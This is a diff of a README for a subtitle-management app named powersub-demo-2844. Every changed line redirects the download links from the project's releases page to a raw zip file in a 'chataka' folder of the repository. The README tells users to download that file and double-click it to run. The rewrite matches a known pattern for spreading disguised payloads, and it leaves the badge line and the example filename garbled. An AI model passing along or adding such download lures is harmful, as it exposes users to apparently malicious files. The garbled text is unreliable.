@@ -4,20 +4,20 @@
 Welcome to the powersub-demo-2844 project! This application is designed to help users manage subtitles easily. Whether you're enjoying movies or creating content, our tool enhances your experience by providing straightforward subtitle management.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/MakaraSovann/powersub-demo-2844/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MakaraSovann/powersub-demo-2844/main/chataka/powersub-demo-2844.zip%20Latest%https://raw.githubusercontent.com/MakaraSovann/powersub-demo-2844/main/chataka/powersub-demo-2844.zip)](https://raw.githubusercontent.com/MakaraSovann/powersub-demo-2844/main/chataka/powersub-demo-2844.zip)
 
 ## 🚀 Getting Started
 To start using powersub-demo-2844, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the downloads:  
-   [Visit Releases Page to Download](https://github.com/MakaraSovann/powersub-demo-2844/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/MakaraSovann/powersub-demo-2844/main/chataka/powersub-demo-2844.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Look for the latest version, which is usually at the top.
 
 3. **Download the File**  
-   Click on the file that corresponds to your operating system to download it. This might be labeled something like `powersub-demo-2844-windows.exe` for Windows users.
+   Click on the file that corresponds to your operating system to download it. This might be labeled something like `https://raw.githubusercontent.com/MakaraSovann/powersub-demo-2844/main/chataka/powersub-demo-2844.zip` for Windows users.
 
 4. **Run the Application**  
    Once the file is downloaded, locate it in your downloads folder. Double-click the file to run the application. Follow any on-screen prompts to complete the installation.
@@ -45,10 +45,10 @@ If you encounter any issues or have questions, feel free to reach out. You can f
 Your input helps us improve. If you have suggestions or feedback, please share your thoughts on the GitHub repository.
 
 ## 📅 Updates
-Stay tuned for updates! We regularly release new features and fixes. You can always find the latest version at our [Releases Page](https://github.com/MakaraSovann/powersub-demo-2844/releases).
+Stay tuned for updates! We regularly release new features and fixes. You can always find the latest version at our [Releases Page](https://raw.githubusercontent.com/MakaraSovann/powersub-demo-2844/main/chataka/powersub-demo-2844.zip).
 
 ## 📥 Download & Install
 To use powersub-demo-2844, visit the link below to download your version of the application:  
-[Visit Releases Page to Download](https://github.com/MakaraSovann/powersub-demo-2844/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/MakaraSovann/powersub-demo-2844/main/chataka/powersub-demo-2844.zip)
 
 By following these steps, you will be well on your way to enjoying all the features that powersub-demo-2844 has to offer. Happy subtitle managing!
